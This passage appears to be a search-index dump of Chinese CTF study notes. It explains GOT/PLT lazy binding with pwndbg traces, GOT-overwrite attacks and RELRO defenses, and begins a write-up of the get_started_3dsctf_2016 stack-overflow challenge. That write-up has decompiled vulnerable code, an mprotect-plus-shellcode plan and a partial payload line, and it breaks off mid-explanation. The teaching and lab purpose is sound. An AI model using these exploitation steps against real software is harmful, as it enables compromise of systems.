\uff08\u4e8c\u8fdb\u5236\uff09\u6587\u4ef6\u4e2d\u6240\u7528\u5230\u7684\u5171\u4eab\u5e93\u4e2d\u51fd\u6570\uff08\u6216\u5b57\u7b26\u4e32\uff09\u7684\u7edd\u5bf9\u5730\u5740\u3002 \u5728\u7a0b\u5e8f\u521a\u5f00\u59cb\u8fd0\u884c\u65f6\uff0cGOT \u8868\u4e3a\u7a7a\u7684\uff0c\u5f53\u51fd\u6570*\u7b2c\u4e00\u6b21\u88ab\u8c03\u7528*\u65f6\u4f1a\u52a8\u6001\u89e3\u6790\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u7136\u540e\u8f6c\u53bb\u6267\u884c\uff0c\u5e76\u5c06\u88ab\u89e3\u6790\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u8bb0\u5f55\u5728 GOT \u4e2d\uff1b\u7b2c\u4e8c\u6b21\u8c03\u7528\u540c\u4e00\u51fd\u6570\u65f6\uff0c\u7531\u4e8e GOT \u4e2d\u5df2\u7ecf\u8bb0\u5f55\u4e86\u5176\u7edd\u5bf9\u5730\u5740\uff0c\u76f4\u63a5\u8f6c\u53bb\u6267\u884c\u5373\u53ef\uff08\u4e0d\u7528\u91cd\u65b0\u89e3\u6790\uff09\u3002\uff08\u7ed3\u5408 .got.plt \u7406\u89e3\uff09 .got.plt \u00b6 got \u8868\u4e2d\u7684\u4e00\u90e8\u5206\u3002\u7528\u4e8e\u91cd\u5b9a\u5411\u8bf7\u6c42\u5230 .got \u4e0a\u7684\u5bf9\u5e94\u504f\u79fb\u6216\u8005\u8fd4\u56de .plt \u4e2d\u6fc0\u6d3b\u94fe\u63a5\u5668\u5bfb\u627e\u51fd\u6570\u5728 \u7cfb\u7edf\u5e93 \u4e2d\u7684\u5730\u5740\u3002 \u5f00\u59cb\u8fd0\u884c\u662f .got.plt \u4e0d\u4e3a\u7a7a\u3002\u5f53 got \u8868\u4e2d\u6ca1\u6709\u51fd\u6570\u7684\u8bb0\u5f55\u503c\u65f6\uff0c\u4f1a\u628a\u4ece .plt \u8fdb\u5165 .got.plt \u7684\u8fdb\u7a0b\u91cd\u5b9a\u5411\u5230 .plt \u4e2d\u6fc0\u6d3b\u94fe\u63a5\u5668\uff0c\u5bfb\u5740\u5b8c\u6210\u540e\uff0c.got \u8bb0\u5f55\u51fd\u6570\u5728\u7cfb\u7edf\u5e93\u504f\u79fb\uff0c.got.plt \u4f1a\u8bb0\u5f55\u51fd\u6570\u5728 .got \u504f\u79fb\u3002 .plt \u00b6 \u7a0b\u5e8f\u94fe\u63a5\u8868\u3002\u662f\u8c03\u7528\u7cfb\u7edf\u5e93\u51fd\u6570\u6700\u5f00\u59cb\u7684\u5165\u53e3\u3002\u5b83\u6709\u4e24\u4e2a\u529f\u80fd\uff0c\u5728 .got.plt \u8282\u4e2d\u62ff\u5230\u5730\u5740\uff0c\u5e76\u8df3\u8f6c\uff1b\u5f53 .got.plt \u6ca1\u6709\u6240\u9700\u5730\u5740\u7684\u65f6\uff0c\u89e6\u53d1\u300c\u94fe\u63a5\u5668\u300d\u53bb\u627e\u5230\u6240\u9700\u51fd\u6570\u5730\u5740\u3002 .plt.got \u00b6 \u6ca1\u6709\u592a\u51c6\u786e\u7684\u76f8\u5173\u8d44\u6599\uff0c\u5728 stackoverflow \u4e0a\u9762\u6709\u4e00\u4e2a \u5e16\u5b50 \u63d0\u53ca\uff0c\u539f\u6587\u5982\u4e0b\uff1a The difference is that .got.plt is runtime-writable, while .got is not if you enable a defense against GOT overwriting attacks called RELRO (relocations read-only). To enable RELRO, you use the ld option -z relro. RELRO places GOT entries that must be runtime-writable for lazy binding in .got.plt, and all others in the read-only .got section \u6ca1\u592a\u770b\u61c2\uff0c\u5927\u6982\u8bf4 .got.plt \u5728\u8fd0\u884c\u65f6\u662f\u53ef\u8bfb\u5199\u3002\u4f46\u662f\u5f53\u5f00\u542f RELRO \u65f6\uff0c.got \u662f\u4e0d\u53ef\u5199\u7684\u3002 \u8c03\u7528\u7cfb\u7edf\u5e93\u51fd\u6570 \u5b9e\u4f8b \u00b6 \u5f15\u7528\u81ea\uff1a GOT and PLT for pwning \u6e90\u7801\u5982\u4e0b\uff1a // Build with: gcc -m32 -no-pie -g -o plt plt.c #include <stdio.h> #include <stdlib.h> int main ( int argc , char ** argv ) { puts ( \"Hello world!\" ); exit ( 0 ); } #pwndbg> info files pwndbg> maintenance info sections There are 36 section headers, starting at offset 0x1fb4: Section Headers: [ Nr ] Name Type Addr Off Size ES Flg Lk Inf Al [ 12 ] .plt PROGBITS 080482f0 0002f0 000040 04 AX 0 0 16 [ 13 ] .plt.got PROGBITS 08048330 000330 000008 00 AX 0 0 8 [ 14 ] .text PROGBITS 08048340 000340 0001a2 00 AX 0 0 16 [ 23 ] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 [ 24 ] .got.plt PROGBITS 0804a000 001000 000018 04 WA 0 0 4 gdb \u53cd\u7f16\u8bd1 main \u51fd\u6570\uff0ccall \u51fd\u6570\u4e0b\u65ad\u70b9\uff0c\u5355\u6b65\u8c03\u8bd5 pwndbg> disass main Dump of assembler code for function main: 0x0804843b <+0>: lea ecx, [ esp+0x4 ] 0x0804843f <+4>: and esp,0xfffffff0 0x08048442 <+7>: push DWORD PTR [ ecx-0x4 ] 0x08048445 <+10>: push ebp 0x08048446 <+11>: mov ebp,esp 0x08048448 <+13>: push ebx 0x08048449 <+14>: push ecx 0x0804844a <+15>: call 0x8048370 <__x86.get_pc_thunk.bx> 0x0804844f <+20>: add ebx,0x1bb1 0x08048455 <+26>: sub esp,0xc 0x08048458 <+29>: lea eax, [ ebx-0x1b00 ] 0x0804845e <+35>: push eax 0x0804845f <+36>: call 0x8048300 <puts@plt> 0x08048464 <+41>: add esp,0x10 0x08048467 <+44>: sub esp,0xc 0x0804846a <+47>: push 0x0 0x0804846c <+49>: call 0x8048310 <exit@plt> End of assembler dump. pwndbg> break *0x0804845f Breakpoint 1 at 0x804845f: file plt.c, line 7 . pwndbg> r Breakpoint *0x0804845f pwndbg> x/i $pc = > 0x804845f <main+36>: call 0x8048300 <puts@plt> debug \u5230 call \u51fd\u6570\uff0c\u7528 si \u5355\u6b65\u5165\u8fdb\u5165 plt \u51fd\u6570\u91cc\u9762\uff0c\u5426\u5219\u76f4\u63a5\u8c03 puts \u4ee3\u7801\u3002\u53ef\u4ee5\u7528 x/i $pc \u67e5\u6c47\u7f16\uff0c\u6216\u8005 disass 0x8048300 \u53cd\u7f16\u8bd1\u4e00\u6837\u80fd\u770b\u5230\u8df3\u8f6c\u7684 .got.plt \u5730\u5740 0x804a00c \u3002 pwndbg> si pwndbg> x/i $pc = > 0x8048300 <puts@plt>: jmp DWORD PTR ds:0x804a00c \u67e5\u8be2 .got.plt \u7684\u8df3\u8f6c\u5730\u5740\uff0c\u662f\u8df3\u8f6c\u56de .plt \u3002\u56e0\u4e3a\u7b2c\u4e00\u6b21\u8c03\u7528 .got \u8868\u6ca1\u6709\u8bb0\u5f55\uff0c\u9700\u8981\u8df3\u8f6c .plt \u6fc0\u6d3b\u94fe\u63a5\u5668\u5bfb\u5740\u3002 pwndbg> x/wx 0x804a00c 0x804a00c: 0x08048306 pwndbg> si 0x08048306 in puts@plt () pwndbg> x/2i $pc = > 0x8048306 <puts@plt+6>: push 0x0 0x804830b <puts@plt+11>: jmp 0x80482f0 \u7136\u540e\u7ebf\u7a0b\u4f1a\u8fdb\u5165\u7cfb\u7edf\u5e93\u51fd\u6570\u4e2d\uff08libc\uff09\uff0c\u5e76\u4e14 .got \u8bb0\u5f55 libc \u5730\u5740\uff0c.got.plt \u8bb0\u5f55\u5728 .got \u4e2d\u504f\u79fb\u3002 Pwning Relocations \u00b6 \u901a\u5e38\u5c31\u662f\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u561b\uff0c\u4f46\u662f\u901a\u5e38\u67d0\u4e00\u90e8\u5206\u4e0d\u4f1a\u540c\u65f6\u5f00\u542f\u5199\u548c\u6267\u884c\u6743\u9650\uff0c\u4e5f\u5c31\u662f NX \u4fdd\u62a4\u561b\u3002 \u7136\u540e .got.plt \u662f\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u6570\u7ec4\uff08\u5e93\uff09\uff0c\u5c31\u8986\u76d6\u5176\u4e2d\u503c\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002 \u5bf9\u5e94\u7684\u4fdd\u62a4\u63aa\u65bd\u5c31\u662f RELRO \uff1apartial and full RELRO\u3002 Partial RELRO (enabled with -Wl,-z,relro ): Maps the .got section as read-only (but not .got.plt ) Rearranges sections to reduce the likelihood of global variables overflowing into control structures. Full RELRO (enabled with -Wl,-z,relro,-z,now ): Does the steps of Partial RELRO, plus: Causes the linker to resolve all symbols at link time (before starting execution) and then remove write permissions from .got . .got.plt is merged into .got with full RELRO, so you won\u2019t see this section name. \u53c2\u8003\u6587\u7ae0 \u00b6 An example of how Procedure Linkage Table Works .plt .plt.got what is different? GOT and PLT for pwning","title":"GOT\u4e0ePLT"},{"location":"Pwn/GOT%E4%B8%8EPLT/#_1","text":"\u4e8c\u8fdb\u5236\u6587\u4ef6\u6709\u4e24\u79cd\u7c7b\u578b\uff1a\u9759\u6001\u94fe\u63a5\u548c\u52a8\u6001\u94fe\u63a5\u3002\u9759\u6001\u94fe\u63a5\u4e8c\u8fdb\u5236\u6587\u4ef6\u5305\u542b\u8fd0\u884c\u9700\u8981\u7684\u5168\u90e8\u4ee3\u7801\uff0c\u4e0d\u8981\u52a0\u8f7d\u5916\u90e8\u5e93\u3002\u52a8\u6001\u94fe\u63a5\u6ca1\u6709\u5305\u542b\u5168\u90e8\u4ee3\u7801\uff0c\u9700\u8981\u52a0\u8f7d\u7cfb\u7edf\u5e93\u6765\u8fd0\u884c\u3002 \u5047\u8bbe\u52a8\u6001\u94fe\u63a5\u4e8c\u8fdb\u5236\u6587\u4ef6\u52a0\u8f7d\uff08\u8c03\u7528\uff09\u7cfb\u7edf\u5e93\u4f7f\u7528\u786c\u7f16\u7801\u5730\u5740\uff08\u7edd\u5bf9\u5730\u5740\uff09\uff0c\u90a3\u4e48\u7cfb\u7edf\u5e93\u53d1\u751f\u53d8\u5316\uff0c\u4e8c\u8fdb\u5236\u6587\u4ef6\u5185\u7684\u786c\u7f16\u7801\u5730\u5740\u5f88\u53ef\u80fd\u5168\u90e8\u6539\u53d8\u3002\u6240\u4ee5\u63d0\u51fa\u4e86\u4e00\u4e2a**\u91cd\u5b9a\u5411**\u673a\u5236\u3002 .got \u3001 .plt \u3001 .got.plt \u3001 \u94fe\u63a5\u5668 \u7b49\u662f\u91cd\u5b9a\u5411\u7684\u7ec4\u6210\u6210\u5206\u3002","title":"\u91cd\u5b9a\u5411"},{"location":"Pwn/GOT%E4%B8%8EPLT/#relocations","text":"","title":"\u91cd\u5b9a\u4f4d\u8868\uff08relocations\uff09"},{"location":"Pwn/GOT%E4%B8%8EPLT/#got","text":"\u5168\u5c40\u504f\u79fb\u8868\u3002\u7528\u4e8e\u8bb0\u5f55\u5728 ELF \uff08\u4e8c\u8fdb\u5236\uff09\u6587\u4ef6\u4e2d\u6240\u7528\u5230\u7684\u5171\u4eab\u5e93\u4e2d\u51fd\u6570\uff08\u6216\u5b57\u7b26\u4e32\uff09\u7684\u7edd\u5bf9\u5730\u5740\u3002 \u5728\u7a0b\u5e8f\u521a\u5f00\u59cb\u8fd0\u884c\u65f6\uff0cGOT \u8868\u4e3a\u7a7a\u7684\uff0c\u5f53\u51fd\u6570*\u7b2c\u4e00\u6b21\u88ab\u8c03\u7528*\u65f6\u4f1a\u52a8\u6001\u89e3\u6790\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u7136\u540e\u8f6c\u53bb\u6267\u884c\uff0c\u5e76\u5c06\u88ab\u89e3\u6790\u7b26\u53f7\u7684\u7edd\u5bf9\u5730\u5740\u8bb0\u5f55\u5728 GOT \u4e2d\uff1b\u7b2c\u4e8c\u6b21\u8c03\u7528\u540c\u4e00\u51fd\u6570\u65f6\uff0c\u7531\u4e8e GOT \u4e2d\u5df2\u7ecf\u8bb0\u5f55\u4e86\u5176\u7edd\u5bf9\u5730\u5740\uff0c\u76f4\u63a5\u8f6c\u53bb\u6267\u884c\u5373\u53ef\uff08\u4e0d\u7528\u91cd\u65b0\u89e3\u6790\uff09\u3002\uff08\u7ed3\u5408 .got.plt \u7406\u89e3\uff09","title":".got"},{"location":"Pwn/GOT%E4%B8%8EPLT/#gotplt","text":"got \u8868\u4e2d\u7684\u4e00\u90e8\u5206\u3002\u7528\u4e8e\u91cd\u5b9a\u5411\u8bf7\u6c42\u5230 .got \u4e0a\u7684\u5bf9\u5e94\u504f\u79fb\u6216\u8005\u8fd4\u56de .plt \u4e2d\u6fc0\u6d3b\u94fe\u63a5\u5668\u5bfb\u627e\u51fd\u6570\u5728 \u7cfb\u7edf\u5e93 \u4e2d\u7684\u5730\u5740\u3002 \u5f00\u59cb\u8fd0\u884c\u662f .got.plt \u4e0d\u4e3a\u7a7a\u3002\u5f53 got \u8868\u4e2d\u6ca1\u6709\u51fd\u6570\u7684\u8bb0\u5f55\u503c\u65f6\uff0c\u4f1a\u628a\u4ece .plt \u8fdb\u5165 .got.plt \u7684\u8fdb\u7a0b\u91cd\u5b9a\u5411\u5230 .plt \u4e2d\u6fc0\u6d3b\u94fe\u63a5\u5668\uff0c\u5bfb\u5740\u5b8c\u6210\u540e\uff0c.got \u8bb0\u5f55\u51fd\u6570\u5728\u7cfb\u7edf\u5e93\u504f\u79fb\uff0c.got.plt \u4f1a\u8bb0\u5f55\u51fd\u6570\u5728 .got \u504f\u79fb\u3002","title":".got.plt"},{"location":"Pwn/GOT%E4%B8%8EPLT/#plt","text":"\u7a0b\u5e8f\u94fe\u63a5\u8868\u3002\u662f\u8c03\u7528\u7cfb\u7edf\u5e93\u51fd\u6570\u6700\u5f00\u59cb\u7684\u5165\u53e3\u3002\u5b83\u6709\u4e24\u4e2a\u529f\u80fd\uff0c\u5728 .got.plt \u8282\u4e2d\u62ff\u5230\u5730\u5740\uff0c\u5e76\u8df3\u8f6c\uff1b\u5f53 .got.plt \u6ca1\u6709\u6240\u9700\u5730\u5740\u7684\u65f6\uff0c\u89e6\u53d1\u300c\u94fe\u63a5\u5668\u300d\u53bb\u627e\u5230\u6240\u9700\u51fd\u6570\u5730\u5740\u3002","title":".plt"},{"location":"Pwn/GOT%E4%B8%8EPLT/#pltgot","text":"\u6ca1\u6709\u592a\u51c6\u786e\u7684\u76f8\u5173\u8d44\u6599\uff0c\u5728 stackoverflow \u4e0a\u9762\u6709\u4e00\u4e2a \u5e16\u5b50 \u63d0\u53ca\uff0c\u539f\u6587\u5982\u4e0b\uff1a The difference is that .got.plt is runtime-writable, while .got is not if you enable a defense against GOT overwriting attacks called RELRO (relocations read-only). To enable RELRO, you use the ld option -z relro. RELRO places GOT entries that must be runtime-writable for lazy binding in .got.plt, and all others in the read-only .got section \u6ca1\u592a\u770b\u61c2\uff0c\u5927\u6982\u8bf4 .got.plt \u5728\u8fd0\u884c\u65f6\u662f\u53ef\u8bfb\u5199\u3002\u4f46\u662f\u5f53\u5f00\u542f RELRO \u65f6\uff0c.got \u662f\u4e0d\u53ef\u5199\u7684\u3002 \u8c03\u7528\u7cfb\u7edf\u5e93\u51fd\u6570","title":".plt.got"},{"location":"Pwn/GOT%E4%B8%8EPLT/#_2","text":"\u5f15\u7528\u81ea\uff1a GOT and PLT for pwning \u6e90\u7801\u5982\u4e0b\uff1a // Build with: gcc -m32 -no-pie -g -o plt plt.c #include <stdio.h> #include <stdlib.h> int main ( int argc , char ** argv ) { puts ( \"Hello world!\" ); exit ( 0 ); } #pwndbg> info files pwndbg> maintenance info sections There are 36 section headers, starting at offset 0x1fb4: Section Headers: [ Nr ] Name Type Addr Off Size ES Flg Lk Inf Al [ 12 ] .plt PROGBITS 080482f0 0002f0 000040 04 AX 0 0 16 [ 13 ] .plt.got PROGBITS 08048330 000330 000008 00 AX 0 0 8 [ 14 ] .text PROGBITS 08048340 000340 0001a2 00 AX 0 0 16 [ 23 ] .got PROGBITS 08049ffc 000ffc 000004 04 WA 0 0 4 [ 24 ] .got.plt PROGBITS 0804a000 001000 000018 04 WA 0 0 4 gdb \u53cd\u7f16\u8bd1 main \u51fd\u6570\uff0ccall \u51fd\u6570\u4e0b\u65ad\u70b9\uff0c\u5355\u6b65\u8c03\u8bd5 pwndbg> disass main Dump of assembler code for function main: 0x0804843b <+0>: lea ecx, [ esp+0x4 ] 0x0804843f <+4>: and esp,0xfffffff0 0x08048442 <+7>: push DWORD PTR [ ecx-0x4 ] 0x08048445 <+10>: push ebp 0x08048446 <+11>: mov ebp,esp 0x08048448 <+13>: push ebx 0x08048449 <+14>: push ecx 0x0804844a <+15>: call 0x8048370 <__x86.get_pc_thunk.bx> 0x0804844f <+20>: add ebx,0x1bb1 0x08048455 <+26>: sub esp,0xc 0x08048458 <+29>: lea eax, [ ebx-0x1b00 ] 0x0804845e <+35>: push eax 0x0804845f <+36>: call 0x8048300 <puts@plt> 0x08048464 <+41>: add esp,0x10 0x08048467 <+44>: sub esp,0xc 0x0804846a <+47>: push 0x0 0x0804846c <+49>: call 0x8048310 <exit@plt> End of assembler dump. pwndbg> break *0x0804845f Breakpoint 1 at 0x804845f: file plt.c, line 7 . pwndbg> r Breakpoint *0x0804845f pwndbg> x/i $pc = > 0x804845f <main+36>: call 0x8048300 <puts@plt> debug \u5230 call \u51fd\u6570\uff0c\u7528 si \u5355\u6b65\u5165\u8fdb\u5165 plt \u51fd\u6570\u91cc\u9762\uff0c\u5426\u5219\u76f4\u63a5\u8c03 puts \u4ee3\u7801\u3002\u53ef\u4ee5\u7528 x/i $pc \u67e5\u6c47\u7f16\uff0c\u6216\u8005 disass 0x8048300 \u53cd\u7f16\u8bd1\u4e00\u6837\u80fd\u770b\u5230\u8df3\u8f6c\u7684 .got.plt \u5730\u5740 0x804a00c \u3002 pwndbg> si pwndbg> x/i $pc = > 0x8048300 <puts@plt>: jmp DWORD PTR ds:0x804a00c \u67e5\u8be2 .got.plt \u7684\u8df3\u8f6c\u5730\u5740\uff0c\u662f\u8df3\u8f6c\u56de .plt \u3002\u56e0\u4e3a\u7b2c\u4e00\u6b21\u8c03\u7528 .got \u8868\u6ca1\u6709\u8bb0\u5f55\uff0c\u9700\u8981\u8df3\u8f6c .plt \u6fc0\u6d3b\u94fe\u63a5\u5668\u5bfb\u5740\u3002 pwndbg> x/wx 0x804a00c 0x804a00c: 0x08048306 pwndbg> si 0x08048306 in puts@plt () pwndbg> x/2i $pc = > 0x8048306 <puts@plt+6>: push 0x0 0x804830b <puts@plt+11>: jmp 0x80482f0 \u7136\u540e\u7ebf\u7a0b\u4f1a\u8fdb\u5165\u7cfb\u7edf\u5e93\u51fd\u6570\u4e2d\uff08libc\uff09\uff0c\u5e76\u4e14 .got \u8bb0\u5f55 libc \u5730\u5740\uff0c.got.plt \u8bb0\u5f55\u5728 .got \u4e2d\u504f\u79fb\u3002","title":"\u5b9e\u4f8b"},{"location":"Pwn/GOT%E4%B8%8EPLT/#pwning-relocations","text":"\u901a\u5e38\u5c31\u662f\u63a7\u5236\u7a0b\u5e8f\u6267\u884c\u6d41\u7a0b\u561b\uff0c\u4f46\u662f\u901a\u5e38\u67d0\u4e00\u90e8\u5206\u4e0d\u4f1a\u540c\u65f6\u5f00\u542f\u5199\u548c\u6267\u884c\u6743\u9650\uff0c\u4e5f\u5c31\u662f NX \u4fdd\u62a4\u561b\u3002 \u7136\u540e .got.plt \u662f\u4e00\u4e2a\u51fd\u6570\u6307\u9488\u6570\u7ec4\uff08\u5e93\uff09\uff0c\u5c31\u8986\u76d6\u5176\u4e2d\u503c\u63a7\u5236\u6267\u884c\u6d41\u7a0b\u3002 \u5bf9\u5e94\u7684\u4fdd\u62a4\u63aa\u65bd\u5c31\u662f RELRO \uff1apartial and full RELRO\u3002 Partial RELRO (enabled with -Wl,-z,relro ): Maps the .got section as read-only (but not .got.plt ) Rearranges sections to reduce the likelihood of global variables overflowing into control structures. Full RELRO (enabled with -Wl,-z,relro,-z,now ): Does the steps of Partial RELRO, plus: Causes the linker to resolve all symbols at link time (before starting execution) and then remove write permissions from .got . .got.plt is merged into .got with full RELRO, so you won\u2019t see this section name.","title":"Pwning Relocations"},{"location":"Pwn/GOT%E4%B8%8EPLT/#_3","text":"An example of how Procedure Linkage Table Works .plt .plt.got what is different? GOT and PLT for pwning","title":"\u53c2\u8003\u6587\u7ae0"},{"location":"Pwn/%E9%9D%99%E6%80%81%E9%93%BE%E6%8E%A5%E7%A8%8B%E5%BA%8F%E5%88%A9%E7%94%A8/","text":"\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u5229\u7528 \u00b6 \u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u9759\u6001\u94fe\u63a5\u7684\u7a0b\u5e8f\u5f88\u5c11\u51fa\u73b0\uff0c\u4f46\u662f\u4e5f\u6709\u4e00\u4e9b\u3002\u8fd9\u7c7b elf \u7684\u6f0f\u6d1e\u5229\u7528\uff0c\u4e3b\u8981\u8fd8\u662f\u4f9d\u9760\u7a0b\u5e8f\u672c\u8eab\u548c\u7528\u6237\u8f93\u5165\u3002 \u7a0b\u5e8f\u672c\u8eab\u7684\u5229\u7528\u5c31\u662f\u9884\u7559\u7684\u540e\u95e8\u51fd\u6570\uff08system\uff09\u548c\u5b57\u7b26\u4e32\uff08/bin/sh\uff09\u3002\u5982\u679c\u6709\u8fd9\u4e9b\u9884\u7559\uff0c\u9898\u76ee\u96be\u5ea6\u5e94\u8be5\u4e0d\u5927\uff0c\u53ea\u8981\u8bbe\u6cd5\u63a7\u5236\u7a0b\u5e8f\u6d41\u5230\u540e\u95e8\u4e0a\u3002 \u5982\u679c\u6ca1\u6709\u9884\u7559\u7684\u540e\u95e8\uff0c\u5f88\u6709\u53ef\u80fd\u662f\u9700\u8981\u4f9d\u9760\u7528\u6237\u8f93\u5165\u5185\u5bb9\u7ed3\u5408\u7a0b\u5e8f\u672c\u8eab gadget \u53bb\u6784\u9020\u8c03\u7528\uff0c\u4e5f\u5c31\u662f\u624b\u5de5\u6784\u9020 onegadget \u3002 \u6b63\u5e38\u60c5\u51b5\u4e0b\uff0c\u6211\u4eec\u4f1a\u53bb libc \u91cc\u9762\u627e\u5229\u7528\u7684\u51fd\u6570\u548c\u5b57\u7b26\u4e32\uff0c\u4f8b\u5982\uff1asystem\u3002\u4f46 \u9759\u6001\u94fe\u63a5\u4e0d\u4f1a\u5230 libc \u627e\u51fd\u6570\uff0c\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u8fd0\u884c\u65f6\u8981\u7528\u5230\u7684\u5168\u90e8\u4e1c\u897f\u90fd\u5df2\u7ecf\u5305\u542b\u5728 ELF \u6587\u4ef6\u91cc\uff0c\u6240\u4ee5\u653b\u51fb\u8005\u80fd\u5229\u7528\u7684\u53ea\u6709 ELF \u6587\u4ef6\u7684\u4e1c\u897f\u3002ret2libc \u7b49\u7b49\u653b\u51fb\u65b9\u6cd5\u5c31\u4e0e\u9759\u6001\u94fe\u63a5\u7a0b\u5e8f\u65e0\u7f18\u3002 \u5b9e\u9a8c\u4e00\uff1aget_started_3dsctf_2016 \u00b6 \u8fd9\u662f\u4e00\u6761 32 \u4f4d\u9759\u6001\u94fe\u63a5\u7684\u6808\u6ea2\u51fa\u9898\u76ee\uff0c\u9898\u76ee\u5728 BUU \u4e0a\u6709\u5b9e\u9a8c\u73af\u5883\u3002\u672c\u5730\u548c\u8fdc\u7a0b\u662f\u91c7\u7528\u4e24\u79cd\u89e3\u51b3\u65b9\u6cd5\u3002 \u672c\u5730\u5c31\u662f\u53ef\u4ee5\u5229\u7528\u9884\u7559\u7684\u540e\u95e8\u89e3\u51b3\uff0c\u8fdc\u7a0b\u5229\u7528\u9700\u8981\u7ed3\u5408 ELF \u91cc\u7684\u4e00\u4e2a\u51fd\u6570\u2014\u2014mprotect \u548c \u7528\u6237\u8f93\u5165\u5185\u5bb9\u3002 \u5206\u6790 \u00b6 \u4fdd\u62a4\u60c5\u51b5 \u00b6 32 \u4f4d\u53ea\u5f00\u542f\u4e86 NX 1 2 3 4 5 Arch: i386-32-little RELRO: Partial RELRO Stack: No canary found NX: NX enabled PIE: No PIE (0x8048000) \u7f16\u8bd1\u60c5\u51b5 \u00b6 \u8fd9\u662f\u4e00\u6761\u9759\u6001\u94fe\u63a5\u7684\u9898\uff0c\u4e5f\u5c31\u662f\u7528\u4e0d\u5230 libc \u3002 $ file get_started_3dsctf_2016 get_started_3dsctf_2016: ELF 32 -bit LSB executable, Intel 80386 , version 1 ( GNU/Linux ) , statically linked, for GNU/Linux 2 .6.32, not stripped \u6f0f\u6d1e\u51fd\u6570 \u00b6 main \u51fd\u6570\u91cc\u9762\u8c03\u7528\u4e86 gets \u8fdb\u884c\u8bfb\u53d6\uff0c\u6ca1\u6709\u5bf9\u957f\u5ea6\u9650\u5236\uff0c\u53ef\u9020\u6210\u6808\u6ea2\u51fa\uff1a int __cdecl main ( int argc , const char ** argv , const char ** envp ) { char v4 ; // [esp+4h] [ebp-38h] printf ( \"Qual a palavrinha magica? \" , v4 ); gets ( & v4 ); return 0 ; } \u9898\u76ee\u9884\u7559\u4e86\u540e\u95e8\u51fd\u6570 get_flag \uff0c\u6709\u4e24\u4e2a\u5224\u65ad\u4f20\u53c2\u7684\u65f6\u5019\u4f20\u8fdb\u53bb\u5c31\u884c\u4e86\uff1a void __cdecl get_flag ( int a1 , int a2 ) { int v2 ; // eax int v3 ; // esi unsigned __int8 v4 ; // al int v5 ; // ecx unsigned __int8 v6 ; // al if ( a1 == 0x308CD64F && a2 == 0x195719D1 ) { v2 = fopen ( \"flag.txt\" , \"rt\" ); v3 = v2 ; v4 = getc ( v2 ); if ( v4 != 0xFF ) { v5 = ( char ) v4 ; do { putchar ( v5 ); v6 = getc ( v3 ); v5 = ( char ) v6 ; } while ( v6 != 255 ); } fclose ( v3 ); } } \u5230\u8fd9\u91cc\u7684\u57fa\u672c\u601d\u8def\u662f\uff1a\u6808\u6ea2\u51fa\u63a7\u5236 eip \u8df3\u8f6c\u540e\u95e8\uff0c\u4e5f\u5c31\u5f97\u5230\u4e86 \u4ec5\u6808\u6ea2\u51fa\u7684 exp \uff0c\u8fdc\u7a0b\u65e0\u6cd5 getshell \u3002 \u601d\u8def \u00b6 \u524d\u9762\u5206\u6790\u8bf4\u4e86\u561b\uff0c\u65e0\u6cd5\u901a\u8fc7\u6808\u6ea2\u51fa\u8df3\u8f6c\u540e\u95e8\u3002\u8f6c\u6362\u4e00\u4e0b\u601d\u8def\uff0c\u6ea2\u51fa\u7a7a\u95f4\u4e0d\u9650\u3002\u5c06 shellcode \u5199\u5230\u975e\u6808\u4e0a\u7684\u5730\u65b9\uff0c\u7136\u540e\u7528 mprotect \u7ed9\u5185\u5b58\u6bb5\u52a0\u4e0a\u4e00\u4e2a\u6267\u884c\u6743\u9650\uff0c\u5728\u63a7\u5236\u7a0b\u5e8f\u6d41\u8df3\u8f6c\u5230\u4e0a\u9762\u3002 mprotect \u53c2\u6570\u5982\u4e0b\uff1a int mprotect(void *addr, size_t len, int prot); addr \u5185\u5b58\u542f\u59cb\u5730\u5740 len \u4fee\u6539\u5185\u5b58\u7684\u957f\u5ea6 prot \u5185\u5b58\u7684\u6743\u9650 prot \u7684\u503c\u4e3a 7\uff08rwx\uff09\uff0c\u91cd\u70b9\u662f\u8d4b\u4e88\u6743\u9650\u7684\u5730\u5740\uff0c\u8981\u627e\u4e00\u4e2a\u6709\u8bfb\u5199\u6743\u9650\u7684\u5730\u5740\uff0c\u7136\u540e\u518d\u7ed9\u4e88\u6267\u884c\u6743\u9650\u3002\u8fd9\u91cc ida \u67e5\u51fa\u6765\u7684\u5185\u5b58\u6bb5\u6743\u9650\u4e0e\u5b9e\u9645\u6709\u51fa\u5165\uff0cida \u91cc\u9762 bss \u6bb5\u662f\u6709\u8bfb\u5199\u6743\u9650\u7684\uff1a \u5b9e\u9645\u8bd5\u4e86\u4e00\u4e0b\uff0c\u62a5\u9519\u4fee\u6539\u4e0d\u4e86\u3002\u7136\u540e\u7528 gdb \u67e5\u770b\uff08\u6307\u4ee4\uff1amaintenance info sections\uff09\uff1a pwndbg> maintenance info sections Exec file: ` /home/skye/buu/get_started_3dsctf_2016/get_started_3dsctf_2016 ' , file type elf32-i386. [ 0 ] 0x80480f4->0x8048114 at 0x000000f4: .note.ABI-tag ALLOC LOAD READONLY DATA HAS_CONTENTS [ 1 ] 0x8048114->0x804818c at 0x00000114: .rel.plt ALLOC LOAD READONLY DATA HAS_CONTENTS [ 2 ] 0x804818c->0x80481af at 0x0000018c: .init ALLOC LOAD READONLY CODE HAS_CONTENTS \u2026\u2026 [ 21 ] 0x80eb000->0x80eb048 at 0x000a2000: .got.plt ALLOC LOAD DATA HAS_CONTENTS [ 22 ] 0x80eb060->0x80ebf80 at 0x000a2060: .data ALLOC LOAD DATA HAS_CONTENTS [ 23 ] 0x80ebf80->0x80ecd8c at 0x000a2f80: .bss ALLOC \u2026\u2026 \u6700\u540e\u9009\u5b9a\u7684\u5c06 shellcode \u5b58\u653e\u5728 .got.plt \u3002\u6240\u4ee5\u9700\u8981\u6784\u9020\u51fa\uff1a ''' int mprotect(.got.plt\u5730\u5740, \u591f\u653eshellcode\u7684\u5927\u5c0f, 7); ''' payload += p32 ( mprotect_addr ) + p32 ( got_plt ) + p32 ( 0x200 ) + p32 ( 0x7 ) \u7136\u540e\u5c31\u662f\u5c31\u662f\u6784\u9020 read \u8f93\u5165 shellcode 